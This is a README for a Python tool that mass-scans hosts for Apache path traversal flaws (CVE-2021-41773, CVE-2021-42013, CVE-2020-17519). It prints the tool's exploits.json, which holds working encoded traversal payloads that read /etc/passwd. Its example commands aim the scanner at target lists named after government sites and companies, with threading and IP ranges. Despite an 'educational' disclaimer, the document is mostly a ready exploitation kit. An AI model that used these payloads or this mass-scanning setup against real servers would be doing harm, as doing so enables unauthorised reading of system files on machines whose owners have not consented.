# ApachSAL
Path Traversal automation vulnerability scanner tool.


### 
|    “ApachSAL”    |
| ------------- |
|![Index](https://i.ibb.co.com/HVZjxzm/Copy-of-Black-Modern-Web-3-Technology-You-Tube-Thumbnail.png)|


<h1 align="center">
  Apache Path Traversal 
</h1> 
  
<img alt="GPL License" src="https://img.shields.io/github/license/imhunterand/ApachSAL?color=blue">
  
<img alt="GitHub code size in bytes" src="https://img.shields.io/github/languages/code-size/imhunterand/ApachSAL">
 
<img alt="Python 3.8" src="https://img.shields.io/badge/python-3.8-yellow.svg">
<img alt="Supported_OS Linux orange" src="https://img.shields.io/badge/Supported_OS-Linux-orange.svg">
<img alt="Supported OS Mac" src="https://img.shields.io/badge/Supported_OS-Mac-orange.svg">
</p>  

### Path traversal (software bug) 
A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).

## Disclaimer 
```
This or previous program is for Educational purpose ONLY. Do not use it without permission. 
The usual disclaimer applies, especially the fact that me (Imhunterand) is not liable for any 
damages caused by direct or indirect use of the information or functionality provided by these 
programs. The author or any Internet provider bears NO responsibility for content or misuse 
of these programs or any derivatives thereof. By using these programs you accept the fact 
that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these 
programs is not Imhunterand responsibility.
``` 


### This script checks for vulnerabilities
- [CVE-2021-41773  ](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
- [CVE-2021-42013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013)
- [CVE-2020-17519](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013)


## Commands
```bash
python main.py --file gov.br.txt  --thread 15
python main.py --file tesla.txt  --ssl
python main.py --range 192.168.15.1,192.168.15.100 --thread 30 
python main.py --file fbi.gov.txt  --thread 15 --timeout 3 
python main.py --file gov.ru.txt  --debug
```
## Screenshots
![Screenshot](/assets/prints/print01.png)
![Screenshot](/assets/prints/print02.png)


## Flow to generate targets
![Screenshot](/assets/prints/print03.jpg)

## Help
```bash
python main.py --help
```
 
```properties

                                   .,,
                                  (=\/\
                                   \=\/\
                                    \=\/\
                                     `=\/
                                        \
            TRAVERSAL [ APACHE ]
 ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██   ██████  ▄▄▄       ██▓
▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▒██    ▒ ▒████▄    ▓██▒
▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░░ ▓██▄   ▒██  ▀█▄  ▒██░
░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██   ▒   ██▒░██▄▄▄▄██ ▒██░
 ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓▒██████▒▒ ▓█   ▓██▒░██████▒
 ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░▓  ░
  ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░░ ░▒  ░ ░  ▒   ▒▒ ░░ ░ ▒  ░
  ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░░  ░  ░    ░   ▒     ░ ░
      ░  ░               ░  ░░ ░       ░  ░  ░      ░        ░  ░    ░  ░
                             ░


                      By: lamcodeofpwnosec /www.pwn0sec.com/
                      https://instagram.com/pwn0sec
                      https://github.com/pwnosec/                                                                     
         
usage: tool [-h] [--file <ips.txt>] [--range <ip-start>,<ip-end>]
            [--thread <20>] [--ssl] [--timeout <5>] [--debug]

[!] Check: CVE-2021-41773, CVE-2021-42013, CVE-2020-17519
[!] File exploits: /assets/exploits.json
[!] Output: output/vuln.txt

python main.py --file redacted.txt  --thread 15
python main.py --file tesla-domain.txt  --ssl
python main.py --range 192.168.15.1,192.168.15.100 --thread 30 
python main.py --file redacted.txt  --thread 15 --timeout 3 
python main.py --file redacted.gov.txt  --debug

optional arguments:
  -h, --help            show this help message and exit
  --file <ips.txt>      Input your target host lists
  --range <ip-start>,<ip-end>
                        Set range IP Eg.: 192.168.15.1,192.168.15.100
  --thread <20>, -t <20>
                        Eg. 20
  --ssl                 Enable request with SSL
  --timeout <5>         Set connection timeout
  --debug, -d           Enable debug mode

```

## Tree
```properties
.
├── assets
│   ├── autor.json
│   ├── config.json
│   ├── exploits.json
│   └── prints
│       ├── banner.png
│       ├── print01.png
│       └── print02.png
├── LICENSE
├── main.py
├── modules
│   ├── banner_mrclw.py
│   ├── color_mrclw.py
│   ├── debug_mrclw.py
│   ├── file_mrclw.py
│   ├── __init__.py
│   ├── request_mrclw.py
│   ├── shodan_mrclw.py
│   └── thread_mrclw.py
├── output
└── README.md
```

## File exploit
> assets/exploits.json 
```json
{
    "CVE-2021-41773": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "CVE-2021-42013-0": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
    "CVE-2021-42013-1": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    "CVE-2021-42013-3": "/cgi-bin/.%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    "CVE-2021-42013-4":"/cgi-bin/%25%25%25%2e/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
    "CVE-2020-17519-0":"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "CVE-2020-17519-1":"/cgi-bin/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
}
```

[![Star History Chart](https://api.star-history.com/svg?repos=pwnosec/ApachSAL&type=Date)](https://star-history.com/#pwnosec/ApachSAL&Date)



### Ref.

- https://owasp.org/www-community/attacks/Path_Traversal
- https://appcheck-ng.com/apache-path-traversal-vulnerability-cve-2021-41773/
- https://www.exploit-db.com/exploits/50383
- https://www.exploit-db.com/exploits/50406
- https://www.exploit-db.com/exploits/49398
- https://owasp.org/www-community/attacks/Path_Traversal


